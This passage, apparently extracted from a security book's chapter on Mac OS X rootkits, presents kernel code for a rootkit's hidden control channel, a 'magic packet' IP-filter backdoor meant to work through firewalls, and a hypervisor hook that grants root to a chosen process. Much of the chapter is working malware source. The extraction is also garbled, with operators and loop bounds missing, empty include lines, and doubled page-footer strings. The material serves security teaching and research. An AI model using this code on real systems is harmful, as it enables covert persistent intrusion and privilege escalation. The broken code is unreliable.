} while (mig_buckets[h++ % MAX_MIG_ENTRIES].num != 0 &&
h num == 0) {
// We found a free spot
r = mig->start - i;
bucket->num = i;
bucket->routine = mig->routine[r].stub_routine;
if (mig->routine[r].max_reply_msg)
bucket->size = mig->routine[r].max_reply_msg;
else
bucket->size = mig->maxsize;
}
else {
// Table was full, return an error
return -1;
}
}
return 0;
}
int remove_subsystem(const struct mig_subsystem * mig)
{
mach_msg_id_t h, i;
// Remove each subroutine exhaustively from the mig_buckets table
for (i = mig->start; i end; i++) {
for (h = 0; h 
#include 
#include 
#include 
#include “krpc.h”
int main(int argc, char* argv[])
{
kern_return_t kr;
if ((kr = krpc_ping(mach_host_self())) != KERN_SUCCESS) {
errx(EXIT_FAILURE, “krpc_ping: %s”, mach_error_string(kr));
}
return 0;
}
When our rootkit is loaded, this call succeeds and returns KERN_SUCCESS.
When our rootkit is not loaded, however, we get an error from the kernel that
it did not recognize our message ID.
% ./KRPCClient
KRPCClient: krpc_ping: (ipc/mig) bad request message ID
Remote Access
To allow our rootkit to provide remote access to the system, we are going to
make our rootkit install an IP Filter. Using the IP Filter kernel programming
interface (KPI), our rootkit will receive unfragmented IP packets before they
are received by or sent from the host. This will allow us to observe, fi lter, and
9955336633cc1122..iinndddd 335522 11//2255//0099 44::4433::2211 PPMM
Chapter 12 ■ Rootkits 353
inject packets from our rootkit and use this capability to implement a remote-
control channel over IP.
Our rootkit will inspect incoming packets for a “magic packet” pattern that
identifi es rootkit backdoor activation and intercept these packets before the host
receives them. Special characteristics of the body of the IP packet will identify
these magic packets so that they can be sent as any type of packet (TCP, UDP,
IPSEC, etc). This gives us fl exibility in making sure the packets can reach the
target, even if it is behind a fi rewall. If any type of IP packet from the outside
reaches the target host, even if such packets will be dropped by its host fi rewall,
we will be able to communicate with our rootkit.
To install an IP Filter, we must declare a fi lter-defi nition structure contain-
ing a “cookie” value used to identify the fi lter, a description string, and three
event functions to handle input, output, and the detaching of the fi lter. Our
fi lter-defi nition structure is shown here:
struct ipf_filter filter_definition = {
(void*)0xdeadbeef,
“”,
on_input,
on_output,
on_detach
};
We install our fi lter using the ipf_addv4() function with the fi lter-defi nition
structure and a pointer to an ipfi lter_t variable to hold the reference to our
installed fi lter. If we call ipf_addv4() with that same reference later on, the kernel
will detach the specifi ed fi lter. Since the same code can be used to attach and
detach the fi lter, we use a toggle_ipfi lter() function as shown here:
static ipfilter_t installed_filter = 0;
static int toggle_ipfilter()
{
errno_t err = 0;
if ((err = ipf_addv4(&filter_definition, &installed_filter)) eax & 0xFFFF0000) == 0xdead0000) {
int pid = regs->eax & 0xFFFF;
proc_t p = proc_find(pid);
if (p) {
struct ucred* uc = proc_ucred(p);
uc->cr_uid = 0;
proc_rele(p);
}
}
else
x86_cpuid(&(regs->eax), &(regs->ebx),
&(regs->ecx), &(regs->edx));
…
case 31: // RDMSR
x86_get_msr(regs->ecx, &(regs->eax), &(regs->edx));
break;
case 32: // WRMSR
x86_set_msr(regs->ecx, regs->eax, regs->edx);
break;
…
The ability of the rootkit hypervisor to intercept device access and events
transparently in the operating-system virtual machine gives it signifi cant sub-
versive power over the running operating system. Through creative use of debug
registers, the hypervisor can even hook functions in the kernel without modify-
ing visible kernel memory at all by setting hardware breakpoints and handling
the breakpoint exceptions in the hypervisor. For more detail, see the Vitriol
source code or New Blue Pill, the second generation of Joanna Rutkowska’s Blue
Pill rootkit for Windows x64 (http://bluepillproject.org/).
Hyperjacking hypervisors can have many other benefi cial uses. For exam-
ple, on systems where hardware virtualization is not needed, a stub hypervi-
sor could securely mitigate access to the processor’s hardware-virtualization
9955336633cc1122..iinndddd 335577 11//2255//0099 44::4433::2211 PPMM
358 Part IV ■ Post-Exploitation
features and prevent hypervisor rootkits from installing themselves. They
could also potentially be used to implement other security systems, such as
host intrusion-prevention systems and antivirus that run in an address space
safe from the reach of even malicious kernel-level software. Since hyperjacking
is a very new technique, only time will tell what other innovative applications
it may be employed for.
Conclusion
This chapter demonstrated how to implement existing and new rootkit tech-
niques on Mac OS X, showing how to hide the rootkit itself and other fi les,
control the rootkit surreptitiously, activate a remote backdoor through a single
IP packet, and give the rootkit advanced stealth capabilities through hardware
virtualization. These techniques build on previous research into rootkits for
Mac OS X and other systems; see the “References” section.
References
XNU kernel source.
Kong, Joseph. Designing BSD rootkits. No Starch Press 2007.
http://landonf.bikemonkey.org/code/macosx/Leopard_PT_DENY_
ATTACH.20080122.html
Hoglund, Greg and Butler, Jamie. Rootkits: Subverting the Windows Kernel.
Addison-Wesley 2005.
http://developer.apple.com/documentation/Darwin/Conceptual/
KEXTConcept/KEXTConceptLoading/loading_kexts.html